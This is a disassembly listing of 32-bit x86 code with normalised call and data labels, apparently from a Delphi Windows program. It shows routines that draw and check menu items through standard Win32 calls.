xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e0a3
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44c628
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44d564
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44e0bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44e9c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d5e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce18
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d5e4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a350
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d5e4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d5e4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_424098
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5b8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d988
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44e507
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422ff4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41ce18
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a350
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d5e4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44d564
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d0e4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41db0c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a868
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dd2c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d8dc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41ce18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403258
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44d564
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e9cb
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44c628
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41db8c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44d564
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44eb18
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44f4fc
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44eb48
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44eb94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44ed76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403454
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44eb48
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44f4fc
mov esi eax
mov eax edi
call sub_44eb18
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043b4
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c64
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404040
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44c628
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed7d
lea eax [ ebp - 0x24 ]
call sub_403fa8
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44d564
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44eda8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043b4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ffc
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44edd0
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44ef40
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44ef50
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44ee18
sub_44ee18
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44d4d4
push eax
call CheckMenuItem
mov eax esi
call sub_44edd0
sub_44ee6c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44ef40
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
